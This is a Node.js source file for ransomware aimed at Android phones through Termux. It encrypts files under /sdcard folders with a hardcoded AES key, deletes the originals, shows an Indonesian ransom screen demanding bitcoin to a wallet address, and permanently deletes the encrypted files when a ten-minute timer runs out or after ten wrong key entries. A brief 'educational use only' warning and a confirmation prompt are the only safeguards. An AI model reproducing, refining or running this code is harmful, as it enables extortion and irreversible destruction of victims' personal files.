const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');

const ガンツ = {
  key: Buffer.alloc(32, '321'.padEnd(32, '\0')),
  targetDirs: [
    "/sdcard/",
    "/sdcard/Download/",
    "/sdcard/Documents/",
    "/sdcard/Pictures/",
    "/sdcard/DCIM/",
    "/sdcard/Movies/",
    "/sdcard/Android/",
    "/sdcard/Android/data/com.termux/files/home/",
    "/sdcard/termux.com/"
  ],
  banner: Buffer.from(
    "IF9fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAKfCAgXyBcIF9fIF8gX19fIF8gX19fICBfIF9fX3wgfCAgX18gIF8gX19fICAgX18gICAKfCAvXykgfCBfXy8gX2AgfCAvXyBcfCB8LyBfYCB8IC8gXyBcIC8gX2AgfCAvIF8gXCAKfCAgXyA8IChffCB8ICB8IChfKSB8IHwgKF8pIHwgfCAgXyAgPCAgIF8vICAKfF8vIFxfX19fX3xffCAgXF9fXy98X3xcX18vfF98XF9fLCB8X3xcX198IHxcX198X3w=",
    "base64"
  ).toString()
};

class SecureRansomware {
  constructor() {
    this.key = ガンツ.key;
    this.cipherAlgorithm = 'aes-256-ctr';
    this.targetDirs = ガンツ.targetDirs;
    this.encryptedFiles = [];
    this.attempts = 0;
    this.maxAttempts = 10;
    this.timerDuration = 600; // 10 minutes
    this.timerActive = true;
    this.startTime = Date.now();
  }

  showBanner() {
    console.clear();
    console.log(ガンツ.banner);
    console.log("!!! PERINGATAN KRITIS !!!");
    console.log("SEMUA FILE ANDA TELAH DIENKRIPSI!");
    
    const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
    const remaining = Math.max(0, this.timerDuration - elapsed);
    const mins = Math.floor(remaining / 60);
    const secs = remaining % 60;
    
    console.log(`Sisa waktu: ${mins} menit ${secs} detik`);
    console.log(`Percobaan tersisa: ${this.maxAttempts - this.attempts}`);
    console.log("\nKirim 0,000002 BTC ke wallet berikut:");
    console.log("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq");
    console.log("\nSetelah waktu habis atau 10 kesalahan,");
    console.log("SEMUA FILE AKAN DIHAPUS PERMANEN!\n");
  }

  findFiles() {
    const results = [];
    for (const dir of this.targetDirs) {
      if (fs.existsSync(dir)) {
        this.scanDir(dir, results);
      }
    }
    return results;
  }

  scanDir(dir, results) {
    try {
      const files = fs.readdirSync(dir);
      for (const file of files) {
        const fullPath = path.join(dir, file);
        try {
          const stat = fs.statSync(fullPath);
          if (stat.isDirectory()) {
            this.scanDir(fullPath, results);
          } else if (
            !fullPath.includes('android') &&
            !fullPath.includes('Android') &&
            !fullPath.includes('system')
          ) {
            results.push(fullPath);
          }
        } catch (e) {
          // Skip permission errors
        }
      }
    } catch (e) {
      // Skip inaccessible directories
    }
  }

  encryptFile(file) {
    return new Promise((resolve) => {
      try {
        const data = fs.readFileSync(file);
        const cipher = crypto.createCipheriv(
          this.cipherAlgorithm,
          this.key,
          Buffer.alloc(16, 0)
        );
        const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
        const newFile = file + '.encrypted';
        fs.writeFileSync(newFile, encrypted);
        fs.unlinkSync(file);
        this.encryptedFiles.push(newFile);
        resolve();
      } catch (e) {
        resolve();
      }
    });
  }

  decryptFile(file) {
    return new Promise((resolve) => {
      try {
        const data = fs.readFileSync(file);
        const decipher = crypto.createDecipheriv(
          this.cipherAlgorithm,
          this.key,
          Buffer.alloc(16, 0)
        );
        const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
        const original = file.replace('.encrypted', '');
        fs.writeFileSync(original, decrypted);
        fs.unlinkSync(file);
        resolve();
      } catch (e) {
        resolve();
      }
    });
  }

  async encryptFiles() {
    const files = this.findFiles();
    for (const file of files) {
      await this.encryptFile(file);
    }
  }

  async decryptFiles() {
    for (const file of this.encryptedFiles) {
      await this.decryptFile(file);
    }
  }

  deleteFiles() {
    for (const file of this.encryptedFiles) {
      try {
        fs.unlinkSync(file);
      } catch (e) {
        // Skip errors
      }
    }
  }

  startTimer() {
    const timer = setInterval(() => {
      if (!this.timerActive) {
        clearInterval(timer);
        return;
      }
      
      const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
      if (elapsed >= this.timerDuration) {
        clearInterval(timer);
        this.timerActive = false;
        console.log("\n[!] WAKTU HABIS! FILE DIHAPUS!");
        this.deleteFiles();
        process.exit(0);
      }
    }, 1000);
  }

  async run() {
    if (this.encryptedFiles.length === 0) {
      await this.encryptFiles();
    }

    this.startTimer();

    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    const prompt = () => {
      this.showBanner();
      rl.question('Masukkan key: ', (input) => {
        if (input === '321') {
          this.timerActive = false;
          rl.close();
          this.decryptFiles().then(() => {
            console.log("\n[+] FILE BERHASIL DIPULIHKAN");
            process.exit(0);
          });
        } else {
          this.attempts++;
          if (this.attempts >= this.maxAttempts) {
            console.log("\n[!] KESALAHAN TERLALU BANYAK! FILE DIHAPUS!");
            rl.close();
            this.deleteFiles();
            process.exit(0);
          }
          setTimeout(prompt, 1000);
        }
      });
    };

    prompt();
  }
}

// Main execution
console.log("\n[!] PERINGATAN: Program ini akan mengenkripsi file!");
console.log("[!] Hanya jalankan untuk tujuan edukasi!");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question("Ketik 'YA' untuk melanjutkan: ", (answer) => {
  if (answer.trim().toUpperCase() === 'YA') {
    const malware = new SecureRansomware();
    malware.run();
  } else {
    console.log("Operasi dibatalkan.");
    rl.close();
  }
});
